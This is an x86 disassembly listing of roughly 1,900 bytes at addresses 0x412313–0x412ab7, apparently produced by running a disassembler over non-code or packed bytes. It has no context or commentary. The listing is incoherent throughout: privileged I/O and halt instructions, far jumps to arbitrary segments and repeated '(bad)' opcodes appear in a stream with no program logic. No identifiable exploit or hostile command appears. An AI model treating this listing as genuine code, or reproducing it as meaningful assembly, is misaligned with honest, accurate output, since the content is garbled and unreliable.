  412313:	imul   ecx,DWORD PTR [ecx-0x51729f26],0x8238a885
  41231d:	mov    dh,0x4e
  41231f:	push   ds
  412320:	mov    al,ds:0xf6f53936
  412325:	sar    DWORD PTR [ecx+0x74725d2c],0x8
  41232c:	stc    
  41232d:	fnstcw WORD PTR [esi+0x3e]
  412330:	dec    esi
  412331:	adc    BYTE PTR [ebp-0x30b6cb3f],ah
  412337:	push   esp
  412338:	sbb    esi,DWORD PTR [esi+0x4f27a86e]
  41233e:	add    BYTE PTR ds:0x24e9b8a5,bl
  412344:	inc    si
  412346:	in     al,0x84
  412348:	jne    0x4123b2
  41234a:	fisttp DWORD PTR [esi-0x5201b66]
  412350:	xor    al,0x33
  412352:	cmp    DWORD PTR [eax-0x28862eaf],0x38fdfe24
  41235c:	sub    al,0x7c
  41235e:	addr16 pop ebx
  412360:	push   ss
  412361:	or     DWORD PTR [ebx+0x6a],esp
  412364:	cmc    
  412365:	mov    esp,0xe94db092
  41236a:	xchg   ecx,eax
  41236b:	mov    al,ds:0x92fa380e
  412370:	jge    0x41239c
  412372:	sbb    al,0x2b
  412374:	or     DWORD PTR [esi],0x11785c94
  41237a:	outs   dx,BYTE PTR ds:[esi]
  41237b:	in     eax,0xea
  41237d:	push   ebp
  41237e:	and    eax,0x663d040c
  412383:	jle    0x4123ff
  412385:	xor    esi,ebx
  412387:	xor    eax,0xa546aacd
  41238c:	cmp    eax,0xebb87253
  412391:	sti    
  412392:	inc    edi
  412393:	mov    al,0xe3
  412395:	push   edx
  412396:	inc    ebx
  412397:	aas    
  412398:	call   0xc63d:0xb0c7d035
  41239f:	pop    eax
  4123a0:	cmc    
  4123a1:	mov    ecx,0x8c5257a7
  4123a6:	mov    ebp,ss
  4123a8:	das    
  4123a9:	hlt    
  4123aa:	jae    0x4123ec
  4123ac:	cmc    
  4123ad:	leave  
  4123ae:	pop    edx
  4123af:	rcr    DWORD PTR [edx-0xa77e3cf],1
  4123b5:	pop    edx
  4123b6:	icebp  
  4123b7:	push   0xfffffff4
  4123b9:	dec    esp
  4123ba:	popa   
  4123bb:	pusha  
  4123bc:	clc    
  4123bd:	cmp    ecx,DWORD PTR [edx]
  4123bf:	iret   
  4123c0:	adc    al,0x31
  4123c2:	dec    edi
  4123c3:	fwait
  4123c4:	cmp    al,0x21
  4123c6:	outs   dx,DWORD PTR ds:[esi]
  4123c7:	rol    esi,0xd1
  4123ca:	out    dx,al
  4123cb:	leave  
  4123cc:	shl    eax,0x55
  4123cf:	cmp    edi,ebp
  4123d1:	sub    DWORD PTR [esi],esi
  4123d3:	add    esi,DWORD PTR [esi-0x136897bb]
  4123d9:	in     eax,dx
  4123da:	(bad)  
  4123db:	lods   al,BYTE PTR ds:[esi]
  4123dc:	add    dl,ch
  4123de:	mov    esi,0x55e24850
  4123e3:	(bad)  
  4123e4:	les    edi,FWORD PTR [ebx]
  4123e6:	loop   0x412450
  4123e8:	pop    edi
  4123e9:	sbb    bl,bh
  4123eb:	push   ss
  4123ec:	mov    bl,0x67
  4123ee:	outs   dx,DWORD PTR ds:[esi]
  4123ef:	xchg   edi,eax
  4123f0:	(bad)  
  4123f1:	je     0x412452
  4123f3:	push   0x7933859a
  4123f8:	mov    bl,0x63
  4123fa:	cwde   
  4123fb:	adc    al,0xe8
  4123fd:	cs push 0xa379ec86
  412403:	pop    ebx
  412404:	int    0x26
  412406:	fbld   TBYTE PTR [eax]
  412408:	jae    0x412446
  41240a:	fcomp  QWORD PTR [eax-0x4]
  41240d:	shr    DWORD PTR [ebx+0x7b],cl
  412410:	mov    ch,0x4a
  412412:	hlt    
  412413:	push   edi
  412414:	mov    edx,0x22fca3b
  412419:	cs mov bh,0x5b
  41241c:	xor    eax,0x13756e0b
  412421:	pop    ebx
  412422:	outs   dx,BYTE PTR ds:[esi]
  412423:	(bad)  
  412424:	push   ebx
  412425:	cmc    
  412426:	inc    edi
  412427:	cmp    DWORD PTR [ebp+ebx*8+0x62],ecx
  41242b:	xor    al,0xba
  41242d:	pop    ebx
  41242e:	push   ds
  41242f:	cdq    
  412430:	in     al,dx
  412431:	lods   eax,DWORD PTR ds:[esi]
  412432:	clc    
  412433:	or     eax,0x380ed1d4
  412438:	mov    dh,0xe3
  41243a:	cmp    bh,BYTE PTR [ecx]
  41243c:	in     eax,dx
  41243d:	inc    ebp
  41243e:	ficom  WORD PTR ds:0xebd17857
  412444:	cmc    
  412445:	mov    esi,0x844e0332
  41244a:	xor    al,0xec
  41244c:	jb     0x412489
  41244e:	xor    DWORD PTR ds:0x4a505ce9,0xfffffffe
  412455:	sub    esp,DWORD PTR [esi]
  412457:	inc    esp
  412458:	cmc    
  412459:	add    DWORD PTR [esi-0x7d],ecx
  41245c:	loope  0x41246e
  41245e:	cli    
  41245f:	inc    ebp
  412460:	cmp    bh,BYTE PTR [eax]
  412462:	loope  0x4124c0
  412464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412465:	cmp    al,0xd6
  412467:	and    dh,BYTE PTR ds:0x239d6f26
  41246d:	arpl   WORD PTR [ecx-0x191fc378],dx
  412473:	sub    cl,BYTE PTR [ecx+0x7517e593]
  412479:	add    DWORD PTR [edi+0x6e],ebp
  41247c:	push   esi
  41247d:	and    eax,0xcb8a1d6f
  412482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412483:	mov    ds:0x38701994,al
  412488:	adc    al,0x69
  41248a:	xor    al,cl
  41248c:	pop    esp
  41248d:	(bad)  
  41248e:	iret   
  41248f:	jne    0x4124d8
  412491:	sbb    esi,DWORD PTR [ebp+0x5b]
  412494:	aas    
  412495:	jmp    0x3f87097f
  41249a:	and    ch,al
  41249c:	push   esp
  41249d:	cmp    dl,dl
  41249f:	test   eax,0x47e18db
  4124a4:	or     DWORD PTR [eax-0x45f7df97],ebp
  4124aa:	inc    edi
  4124ab:	push   esi
  4124ac:	pop    esp
  4124ad:	pop    eax
  4124ae:	sbb    DWORD PTR [ecx-0x2506c421],ebx
  4124b4:	mov    dh,0x9c
  4124b6:	adc    al,0x61
  4124b8:	pusha  
  4124b9:	add    ch,BYTE PTR [esi+0x3e]
  4124bc:	rol    BYTE PTR [ebp+0x680e8a67],cl
  4124c2:	cmp    bh,BYTE PTR [ecx]
  4124c4:	(bad)  
  4124c5:	and    DWORD PTR [ecx-0x30431f21],edx
  4124cb:	mov    al,0xf5
  4124cd:	adc    al,0x17
  4124cf:	push   edi
  4124d0:	in     al,0xae
  4124d2:	or     BYTE PTR [ecx-0x32c1e070],0xd0
  4124d9:	cmp    edi,DWORD PTR [edx-0x3c]
  4124dc:	pop    ecx
  4124dd:	clc    
  4124de:	fld    st(3)
  4124e0:	cmc    
  4124e1:	bound  eax,QWORD PTR [edx-0x1c]
  4124e4:	sub    al,0x3b
  4124e6:	ins    BYTE PTR es:[edi],dx
  4124e7:	mov    ds,WORD PTR [ebx-0x5c]
  4124ea:	stc    
  4124eb:	cmp    bh,ah
  4124ed:	mov    dl,0xc
  4124ef:	stos   DWORD PTR es:[edi],eax
  4124f0:	ins    BYTE PTR es:[edi],dx
  4124f1:	mov    eax,ds:0x4af34b94
  4124f6:	outs   dx,DWORD PTR ds:[esi]
  4124f7:	rcl    BYTE PTR [edi-0x2a8a1c91],cl
  4124fd:	and    DWORD PTR [eax],esp
  4124ff:	cmp    DWORD PTR [edx+0x72a91dac],esi
  412505:	out    dx,eax
  412506:	jnp    0x412521
  412508:	in     al,0x32
  41250a:	pop    ecx
  41250b:	xor    BYTE PTR [edi-0x48],al
  41250e:	push   edx
  41250f:	add    edx,DWORD PTR [ecx]
  412511:	mov    esi,0x156c2fdf
  412516:	mov    DWORD PTR [edx+edi*4+0x67b8aae7],eax
  41251d:	stos   BYTE PTR es:[edi],al
  41251e:	sub    ah,dl
  412520:	pop    ebp
  412521:	in     eax,0x1c
  412523:	cmp    DWORD PTR [ecx+0x3bad63e5],ebp
  412529:	push   edi
  41252a:	sub    BYTE PTR [eax-0xb],al
  41252d:	lds    edx,FWORD PTR [ecx-0x3]
  412530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412531:	xchg   edx,eax
  412532:	jl     0x41252a
  412534:	mov    ebx,0x2b5f323b
  412539:	lods   eax,DWORD PTR ds:[esi]
  41253a:	es ret 
  41253c:	adc    edx,DWORD PTR [ecx-0x12]
  41253f:	pop    ss
  412540:	cmc    
  412541:	enter  0xb44a,0x6
  412545:	lock mov al,ds:0x67a35eec
  41254b:	ds pop eax
  41254d:	into   
  41254e:	call   0x75c6:0x934a2ec4
  412555:	ret    0x97b1
  412558:	lods   al,BYTE PTR ds:[esi]
  412559:	cmp    ecx,DWORD PTR [edx]
  41255b:	or     BYTE PTR [esi+edi*8-0x802d41b],al
  412562:	outs   dx,BYTE PTR ds:[esi]
  412563:	dec    ebp
  412564:	fst    QWORD PTR [ebp+edi*8+0x5a]
  412568:	mov    BYTE PTR ds:0xeb403889,0xb7
  41256f:	jns    0x41250e
  412571:	add    al,0x83
  412573:	mov    eax,ds:0xb872e334
  412578:	mov    bh,0xd3
  41257a:	mov    ss,WORD PTR [edi+0x6e]
  41257d:	stc    
  41257e:	pop    eax
  41257f:	cmp    DWORD PTR [eax+0x78],edx
  412582:	mov    bh,BYTE PTR [ebp-0x348891ca]
  412588:	cmc    
  412589:	cwde   
  41258a:	es add al,0x68
  41258d:	xchg   edx,eax
  41258e:	fcomp  st(6)
  412590:	cmp    DWORD PTR [eax],edi
  412592:	mov    es,WORD PTR [ebx-0x361c864f]
  412598:	or     dh,ch
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	xchg   ecx,eax
  41259c:	pop    es
  41259d:	mov    DWORD PTR [ecx+0x66794b15],ebp
  4125a3:	cmp    DWORD PTR [ebx],eax
  4125a5:	out    0xcc,al
  4125a7:	sti    
  4125a8:	sub    al,0x13
  4125aa:	add    al,0xdf
  4125ac:	cmc    
  4125ad:	xchg   ebx,eax
  4125ae:	pop    ebx
  4125af:	cmp    BYTE PTR [ebp+0x51],ch
  4125b2:	mov    edx,0xbb380770
  4125b7:	iret   
  4125b8:	and    DWORD PTR [ebp-0x80],edx
  4125bb:	gs bound esi,QWORD PTR fs:[esi+0x64]
  4125c0:	xchg   edx,eax
  4125c1:	addr16 push 0x4689a53c
  4125c7:	and    DWORD PTR [edx],edi
  4125c9:	cmp    BYTE PTR [edx],cl
  4125cb:	sub    eax,0x9dc1c293
  4125d0:	outs   dx,DWORD PTR ds:[esi]
  4125d1:	jno    0x41261e
  4125d3:	sbb    eax,0x19873df5
  4125d8:	mov    cl,0x4e
  4125da:	inc    ecx
  4125db:	jmp    FWORD PTR [esi]
  4125dd:	cmp    dh,cl
  4125df:	int    0x76
  4125e1:	xchg   BYTE PTR [edi-0x37],ch
  4125e4:	xor    eax,0xf51cdb98
  4125e9:	sar    BYTE PTR ds:0x738a86e6,cl
  4125ef:	mov    eax,ds:0xd88d3b83
  4125f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125f5:	(bad)  
  4125f6:	mov    edx,0x6ea80cb7
  4125fb:	sbb    edx,ecx
  4125fd:	test   ecx,0x706919af
  412603:	cmp    BYTE PTR [eax],cl
  412605:	cs out dx,al
  412607:	lods   eax,DWORD PTR ds:[esi]
  412608:	push   es
  412609:	push   esi
  41260a:	xor    eax,0x9215ece4
  41260f:	enter  0x51da,0x4f
  412613:	fsubr  st(3),st
  412615:	pop    ss
  412616:	dec    BYTE PTR [edx+0x75]
  412619:	push   edx
  41261a:	(bad)  
  41261b:	cmp    cl,ch
  41261d:	repz fst QWORD PTR [ecx+0x18]
  412621:	(bad)  
  412622:	add    al,0x1d
  412624:	cmc    
  412625:	clc    
  412626:	test   DWORD PTR [edx-0x4b9c1128],ecx
  41262c:	or     edi,DWORD PTR [eax]
  41262e:	dec    ecx
  41262f:	xor    al,0x3d
  412631:	out    0x82,al
  412633:	xchg   ebx,eax
  412634:	popf   
  412635:	and    esp,ebp
  412637:	sbb    al,0x11
  412639:	jns    0x412665
  41263b:	mov    eax,0x94873bb4
  412640:	ror    DWORD PTR [edx],cl
  412642:	pop    esp
  412643:	cli    
  412644:	dec    edi
  412645:	cmp    BYTE PTR [edi],bh
  412647:	popa   
  412648:	(bad)  
  41264a:	ret    0xa1b1
  41264d:	adc    ebp,DWORD PTR [esi+0x1e]
  412650:	loopne 0x412686
  412652:	push   es
  412653:	adc    eax,0x395a2666
  412658:	dec    ecx
  412659:	or     DWORD PTR [edx+eiz*4+0x62],esp
  41265d:	ret    0x8a0a
  412660:	xor    al,0x88
  412662:	xlat   BYTE PTR ds:[ebx]
  412663:	mov    ecx,0x8bde5013
  412668:	hlt    
  412669:	lods   eax,DWORD PTR ds:[esi]
  41266a:	mov    ?,WORD PTR [ebx-0x1eadc45f]
  412670:	inc    eax
  412672:	or     al,0xfc
  412674:	pop    edx
  412675:	icebp  
  412676:	outs   dx,BYTE PTR ds:[esi]
  412677:	push   0xffffffa6
  412679:	daa    
  41267a:	ins    DWORD PTR es:[edi],dx
  41267b:	clc    
  41267c:	shl    ebx,1
  41267e:	pop    ebx
  41267f:	cmp    DWORD PTR [ebx+0x5dd8f61d],ebp
  412685:	pop    ecx
  412686:	or     bl,0xf5
  412689:	daa    
  41268a:	xchg   ecx,eax
  41268b:	not    BYTE PTR [ecx-0x158fa5a3]
  412691:	cmp    BYTE PTR [eax+0x13f7c217],al
  412697:	ds pop ebx
  412699:	and    eax,0x67c0616f
  41269e:	mov    dl,0xc0
  4126a0:	pop    ebp
  4126a1:	jns    0x4126fe
  4126a3:	sub    al,0xa
  4126a5:	mov    WORD PTR [edx],?
  4126a7:	xor    al,0xb0
  4126a9:	(bad)  
  4126aa:	out    dx,al
  4126ab:	popa   
  4126ac:	xchg   ebx,eax
  4126ad:	sti    
  4126ae:	mov    ds:0xfbe5f5fb,eax
  4126b3:	js     0x4126a1
  4126b5:	(bad)  
  4126b6:	(bad)
  4126ba:	pop    ss
  4126bb:	ins    DWORD PTR es:[edi],dx
  4126bc:	pop    ebp
  4126bd:	js     0x4126e1
  4126bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126c0:	out    dx,al
  4126c1:	mov    WORD PTR [ecx-0x76],ds
  4126c4:	xor    BYTE PTR [ecx],ch
  4126c6:	inc    ebx
  4126c7:	cmp    DWORD PTR [ebp+0xd],eax
  4126ca:	push   edx
  4126cb:	push   cs
  4126cc:	mov    esi,0x2139013f
  4126d1:	je     0x412700
  4126d3:	push   esp
  4126d4:	pusha  
  4126d5:	std    
  4126d6:	inc    ebx
  4126d7:	or     dh,ch
  4126d9:	stc    
  4126da:	jbe    0x41269e
  4126dc:	jp     0x412669
  4126de:	mov    al,0x60
  4126e0:	lea    edx,[edi+0x29]
  4126e3:	in     eax,0x64
  4126e5:	sbb    DWORD PTR [ebp+0x4],esi
  4126e8:	dec    edi
  4126e9:	push   edi
  4126ea:	das    
  4126eb:	sbb    DWORD PTR [esi],ebx
  4126ed:	jge    0x4126cb
  4126ef:	loopne 0x412725
  4126f1:	or     BYTE PTR [esi+0x39],ah
  4126f4:	js     0x4126ef
  4126f6:	leave  
  4126f7:	dec    eax
  4126f8:	jnp    0x412680
  4126fa:	push   edi
  4126fb:	cmp    DWORD PTR [ebp+0x2c],ebp
  4126fe:	stc    
  4126ff:	nop
  412700:	out    dx,eax
  412701:	dec    al
  412703:	add    esi,ebp
  412705:	xor    eax,DWORD PTR [ebp-0x5e]
  412708:	test   edx,ebx
  41270a:	jnp    0x41274a
  41270c:	push   ds
  41270d:	cmp    ah,bl
  41270f:	sar    bl,1
  412711:	sahf   
  412712:	push   es
  412713:	aad    0x82
  412715:	inc    esp
  412716:	push   0x2b9a2f1f
  41271b:	ja     0x4126b5
  41271d:	mov    edi,0x38ed0e62
  412722:	fnstenv [ebx+0x60]
  412725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412726:	mov    edi,0x6f896d05
  41272b:	jnp    0x41279e
  41272d:	mov    esi,DWORD PTR [ebx+0x4353cc01]
  412733:	or     dh,BYTE PTR [edi+0x38]
  412736:	(bad)  
  412737:	dec    edi
  412738:	sub    DWORD PTR [edx-0x2d],ebp
  41273b:	shr    BYTE PTR [ebx+eiz*1-0x61],cl
  41273f:	in     al,0xbe
  412741:	(bad)  [ebx-0x42c45f4b]
  412747:	cs push 0xffffffa4
  41274a:	and    ch,ah
  41274c:	jg     0x412715
  41274e:	es es cmc 
  412751:	pusha  
  412752:	jl     0x4127bf
  412754:	mov    DWORD PTR [ecx+esi*1],ecx
  412757:	sbb    ecx,eax
  412759:	or     esp,edi
  41275b:	lods   eax,DWORD PTR ds:[esi]
  41275c:	mov    ecx,0x7b27ca15
  412761:	mov    eax,0xccf23309
  412766:	lods   al,BYTE PTR ds:[esi]
  412767:	enter  0xbbbf,0x83
  41276b:	xor    DWORD PTR [esi+esi*2+0x3bd762b7],edi
  412772:	push   edx
  412773:	mov    edx,0x3e9c8033
  412778:	sub    DWORD PTR [edx],eax
  41277a:	xchg   esp,eax
  41277b:	inc    esi
  41277c:	not    ah
  41277e:	jl     0x41275a
  412780:	sbb    bl,BYTE PTR [eax+0x649c07f7]
  412786:	jecxz  0x4127c0
  412788:	cli    
  412789:	inc    dl
  41278b:	int3   
  41278c:	int    0xb4
  41278e:	mov    ecx,0x6ec07362
  412793:	jne    0x412802
  412795:	fistp  WORD PTR [ecx]
  412797:	out    0xde,eax
  412799:	xchg   bl,ah
  41279b:	cmp    BYTE PTR [ebx+0x71],al
  41279e:	adc    BYTE PTR [edx+0x1a87a014],cl
  4127a4:	test   DWORD PTR [ebx-0x6b50b274],esp
  4127aa:	scas   al,BYTE PTR es:[edi]
  4127ab:	sub    BYTE PTR [esi+0x59],0x35
  4127af:	call   0x23656392
  4127b4:	xchg   DWORD PTR [ecx-0x771142ee],ebx
  4127ba:	outs   dx,BYTE PTR ds:[esi]
  4127bb:	add    ebx,DWORD PTR [edx-0x7403f994]
  4127c1:	scas   al,BYTE PTR es:[edi]
  4127c2:	hlt    
  4127c3:	dec    esp
  4127c4:	mov    ecx,0x9ecd153b
  4127c9:	stc    
  4127ca:	aam    0x13
  4127cc:	shr    BYTE PTR [bp-0x40],cl
  4127d0:	jmp    0x412802
  4127d2:	and    ch,BYTE PTR [edi+ebp*8]
  4127d5:	int    0x65
  4127d7:	sub    esp,0x214de801
  4127dd:	push   cs
  4127de:	push   es
  4127df:	xor    bl,dl
  4127e1:	mov    ah,0x7c
  4127e3:	inc    ebx
  4127e4:	fisubr DWORD PTR [ebx+0xec043fa]
  4127ea:	sub    BYTE PTR [esi+0x2c],0xd5
  4127ee:	outs   dx,BYTE PTR ds:[esi]
  4127ef:	sbb    bl,BYTE PTR [ecx]
  4127f1:	adc    edi,0x78
  4127f4:	test   BYTE PTR [edi+esi*4-0x10],bh
  4127f8:	dec    ecx
  4127f9:	fist   WORD PTR [esi-0x20]
  4127fc:	mov    cl,bh
  4127fe:	outs   dx,BYTE PTR ds:[esi]
  4127ff:	and    dh,BYTE PTR [esi+0x18bc24ed]
  412805:	pshufw mm7,QWORD PTR [eax],0x3b
  412809:	sahf   
  41280a:	xor    ebx,DWORD PTR ds:0x74b5ab97
  412810:	out    dx,al
  412811:	dec    esi
  412812:	push   ebx
  412813:	adc    esi,DWORD PTR [esi]
  412815:	cmp    BYTE PTR [ebx+0x77],dl
  412818:	mov    ecx,0x94395538
  41281d:	fcomp  QWORD PTR [ecx]
  41281f:	enter  0xedfc,0x2e
  412823:	out    dx,al
  412824:	jecxz  0x412849
  412826:	jmp    0xb42b:0x9f787637
  41282d:	loope  0x412825
  41282f:	aas    
  412830:	xchg   edi,eax
  412831:	sti    
  412832:	cmp    esp,DWORD PTR [ecx]
  412834:	jnp    0x412855
  412836:	outs   dx,BYTE PTR ds:[esi]
  412837:	jb     0x412889
  412839:	arpl   WORD PTR [eax+0x420fdf21],bx
  41283f:	ds inc edx
  412841:	or     ebx,DWORD PTR [esi-0x61]
  412844:	pop    ecx
  412845:	cs sub eax,0xa7a7d659
  41284b:	scas   eax,DWORD PTR es:[edi]
  41284c:	add    BYTE PTR [ecx],dh
  41284e:	addr16 jo 0x412810
  412851:	jg     0x412872
  412853:	jmp    0x454e:0x3912e135
  41285a:	repnz mov esi,0x60b40ec5
  412860:	cmc    
  412861:	sub    DWORD PTR [edx-0x5c],edx
  412864:	sub    DWORD PTR [edx+0x3bb15485],esi
  41286a:	sub    dh,al
  41286c:	push   ecx
  41286d:	sbb    DWORD PTR [ecx+0x63e64802],ebx
  412873:	pop    ecx
  412874:	add    al,0xfb
  412876:	jl     0x412813
  412878:	pop    es
  412879:	or     ebp,esi
  41287b:	sub    ebp,eax
  41287d:	fsubr  DWORD PTR ds:0xc390c6d2
  412883:	loopne 0x412833
  412885:	jp     0x4128f6
  412887:	mov    ebx,0xa7063640
  41288c:	jg     0x412903
  41288e:	outs   dx,DWORD PTR ds:[esi]
  41288f:	shl    DWORD PTR [ebx+0x36be5981],0x52
  412896:	mov    dh,0x33
  412898:	sbb    al,0x66
  41289a:	pop    edi
  41289b:	sar    DWORD PTR [ebx+edi*4+0x22d31b6d],cl
  4128a2:	outs   dx,DWORD PTR ds:[esi]
  4128a3:	stos   BYTE PTR es:[edi],al
  4128a4:	shr    BYTE PTR ds:0x7b33b9f9,cl
  4128aa:	scas   eax,DWORD PTR es:[edi]
  4128ab:	cmp    BYTE PTR ds:0xd0169342,bh
  4128b1:	mov    edx,ebx
  4128b3:	adc    eax,0xa296d6e8
  4128b8:	mov    al,bl
  4128ba:	aam    0x60
  4128bc:	push   es
  4128bd:	out    0x50,al
  4128bf:	cmp    al,0x27
  4128c1:	cmp    ecx,eax
  4128c3:	addr16 mov dl,0xc9
  4128c6:	push   ss
  4128c7:	nop
  4128c8:	shl    edx,0x69
  4128cb:	dec    edi
  4128cc:	add    bh,BYTE PTR [eax+ecx*4-0x229c632c]
  4128d3:	(bad)  
  4128d4:	test   DWORD PTR [ebx],edi
  4128d6:	das    
  4128d7:	sar    DWORD PTR ds:0x4e8d9647,0x5a
  4128de:	outs   dx,DWORD PTR ds:[esi]
  4128df:	(bad)  
  4128e1:	jg     0x412876
  4128e3:	outs   dx,DWORD PTR ds:[esi]
  4128e4:	outs   dx,BYTE PTR ds:[esi]
  4128e5:	inc    ecx
  4128e6:	leave  
  4128e7:	cmp    ebx,edx
  4128e9:	fstp   DWORD PTR [edx]
  4128eb:	adc    ebx,ebx
  4128ed:	ss inc eax
  4128ef:	pop    ebp
  4128f0:	mov    dl,0x77
  4128f2:	outs   dx,DWORD PTR ds:[esi]
  4128f3:	dec    ecx
  4128f4:	cwde   
  4128f5:	xor    eax,0x34802cbd
  4128fa:	push   edi
  4128fb:	add    eax,0x5df5cd8d
  412900:	ds cs stc 
  412903:	or     BYTE PTR [ebx-0x33],cl
  412906:	hlt    
  412907:	mov    es,ebx
  412909:	outs   dx,DWORD PTR fs:[esi]
  41290b:	mov    edx,0x8d2d6363
  412910:	aam    0xb0
  412912:	push   esi
  412913:	cmp    eax,ebp
  412915:	pop    es
  412916:	push   edi
  412917:	dec    esp
  412918:	out    dx,eax
  412919:	inc    esi
  41291a:	adc    eax,0xb9d0f55d
  41291f:	lock pop ss
  412921:	adc    BYTE PTR [edx+0x35],al
  412924:	xchg   ebx,eax
  412925:	cmp    cl,ah
  412927:	add    esp,DWORD PTR [edx-0x77db17b7]
  41292d:	jae    0x412928
  41292f:	popa   
  412930:	cmc    
  412931:	repz stc 
  412933:	sub    edi,DWORD PTR cs:[ecx]
  412936:	jbe    0x412990
  412938:	pop    ebx
  412939:	in     eax,0xf2
  41293b:	stos   DWORD PTR es:[edi],eax
  41293c:	div    BYTE PTR [esi]
  41293e:	ffree  st(2)
  412940:	push   0x2a70b753
  412945:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412946:	outs   dx,BYTE PTR ds:[esi]
  412947:	push   0xffffff97
  412949:	fstp   DWORD PTR [eax-0x1d]
  41294c:	nop
  41294d:	jmp    0xd4e16287
  412952:	xor    ecx,0xe
  412955:	pop    esi
  412956:	js     0x41292c
  412958:	inc    edi
  412959:	mov    ds:0xc238fd6e,al
  41295e:	push   edi
  41295f:	dec    esi
  412960:	inc    edx
  412961:	cmp    DWORD PTR [edx],eax
  412963:	cmp    DWORD PTR [ebx+0x251736c4],eax
  412969:	lods   eax,DWORD PTR ds:[esi]
  41296a:	sub    ebp,DWORD PTR [ebp+0x7c]
  41296d:	fild   QWORD PTR [esi-0x3a]
  412970:	dec    ecx
  412971:	icebp  
  412972:	fild   WORD PTR [edi]
  412974:	ins    DWORD PTR es:[edi],dx
  412975:	push   esi
  412976:	out    dx,al
  412977:	cwde   
  412978:	add    dh,0x26
  41297b:	cmp    DWORD PTR [esi+0x36],ebx
  41297e:	and    DWORD PTR [esi+0xfcd79de],eax
  412984:	aad    0x53
  412986:	outs   dx,DWORD PTR ds:[esi]
  412987:	jmp    0x4129f9
  412989:	mov    al,0xc1
  41298b:	xchg   esi,eax
  41298c:	xor    ecx,edi
  41298e:	sub    edi,DWORD PTR [ecx]
  412990:	cwde   
  412991:	pop    edx
  412992:	rcl    DWORD PTR [edx-0x4],cl
  412995:	xor    eax,0xe5f59b06
  41299a:	test   BYTE PTR [ecx-0x3b76cb2e],dh
  4129a0:	push   ebx
  4129a1:	cmp    eax,0xb0165f6a
  4129a6:	sbb    eax,edi
  4129a8:	mov    ch,0xbe
  4129aa:	call   0xe93b:0xa3143d27
  4129b1:	mov    ecx,0x5a1d0153
  4129b6:	das    
  4129b7:	mov    al,ds:0x38f90656
  4129bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129bd:	(bad)  
  4129be:	xor    ebp,ebx
  4129c0:	(bad)  
  4129c1:	in     al,0x96
  4129c3:	pop    ds
  4129c4:	lds    edi,FWORD PTR [esi+0x73]
  4129c7:	xlat   BYTE PTR ds:[ebx]
  4129c8:	sub    eax,0xe22a91e9
  4129cd:	cmp    dl,cl
  4129cf:	int3   
  4129d0:	jmp    0x412963
  4129d2:	and    edi,DWORD PTR [esi]
  4129d4:	adc    bl,ch
  4129d6:	outs   dx,DWORD PTR ds:[esi]
  4129d7:	cld    
  4129d8:	mov    esi,0x28119e1f
  4129dd:	push   eax
  4129de:	dec    esi
  4129df:	jns    0x4129c9
  4129e1:	sbb    BYTE PTR [eax+esi*1],ch
  4129e4:	jnp    0x41296e
  4129e6:	loop   0x412a3b
  4129e8:	mov    ecx,DWORD PTR [ebx-0x76]
  4129eb:	shl    DWORD PTR [ebp-0x5f],0x6e
  4129ef:	xor    ebx,ebx
  4129f1:	imul   esp,DWORD PTR [ebx],0x7d
  4129f4:	and    eax,0x6539487e
  4129f9:	mov    bl,0x7
  4129fb:	and    al,0xde
  4129fd:	int3   
  4129fe:	mov    BYTE PTR [esi+0x46],bl
  412a01:	leave  
  412a02:	outs   dx,BYTE PTR ds:[esi]
  412a03:	xchg   cl,cl
  412a05:	sbb    al,0x75
  412a07:	sub    BYTE PTR [ecx-0x48c73562],bl
  412a0d:	cli    
  412a0e:	mov    ah,0x99
  412a10:	adc    BYTE PTR [ebx-0x630a2ab3],0xe9
  412a17:	mov    esp,0xf22537fe
  412a1c:	push   esi
  412a1d:	mov    BYTE PTR [ebp+eiz*1+0x78ecf75d],ah
  412a24:	(bad)  
  412a25:	lods   eax,DWORD PTR ds:[esi]
  412a26:	fwait
  412a27:	clc    
  412a28:	pop    edx
  412a29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a2a:	outs   dx,BYTE PTR ds:[esi]
  412a2b:	inc    edi
  412a2c:	dec    esp
  412a2d:	mov    ecx,0x49ae646d
  412a32:	stc    
  412a33:	sbb    ebx,DWORD PTR [ebx-0x20]
  412a36:	jecxz  0x412a22
  412a38:	in     al,dx
  412a39:	xchg   esp,eax
  412a3a:	dec    esi
  412a3b:	adc    eax,0x74017c1c
  412a40:	loopne 0x412a37
  412a42:	dec    ah
  412a44:	or     DWORD PTR [eax+0x5ac3d31a],edi
  412a4a:	mov    bh,BYTE PTR [ecx]
  412a4c:	mov    dl,0xaa
  412a4e:	mov    bl,0x28
  412a50:	xor    DWORD PTR [eax+0x40a95524],edi
  412a56:	push   0xffffff95
  412a58:	ja     0x4129e4
  412a5a:	dec    edx
  412a5b:	or     al,0xe9
  412a5d:	mov    eax,0x3bb5474d
  412a62:	xor    esi,DWORD PTR [ebp+0x67defc47]
  412a68:	or     eax,0x16d76eb2
  412a6d:	(bad)  
  412a6e:	stc    
  412a6f:	xchg   ebx,eax
  412a70:	test   BYTE PTR [esi],dh
  412a72:	jno    0x412aca
  412a74:	scas   al,BYTE PTR es:[edi]
  412a75:	or     DWORD PTR [ebp-0x7115eedf],ecx
  412a7b:	dec    ebx
  412a7c:	jmp    0x7507:0xf5d8f321
  412a83:	mov    eax,ds:0x41a88d90
  412a88:	rcl    BYTE PTR [edi],cl
  412a8a:	push   ebp
  412a8b:	js     0x412a81
  412a8d:	cmp    eax,DWORD PTR [edx-0x4f789dd3]
  412a93:	mov    esp,0x9c6e8cc9
  412a98:	out    0xd6,eax
  412a9a:	inc    esp
  412a9b:	pop    ss
  412a9c:	mov    eax,ds:0xe388945
  412aa1:	test   ecx,0x1e6bede2
  412aa7:	xor    ch,dh
  412aa9:	sar    BYTE PTR [ecx+0x7be6cbc9],0xe
  412ab0:	and    al,0x38
  412ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ab3:	jb     0x412aec
  412ab5:	lods   eax,DWORD PTR ds:[esi]
  412ab6:	dec    ebp
  412ab7:	or     BYTE PTR [ebx+eax*2],cl
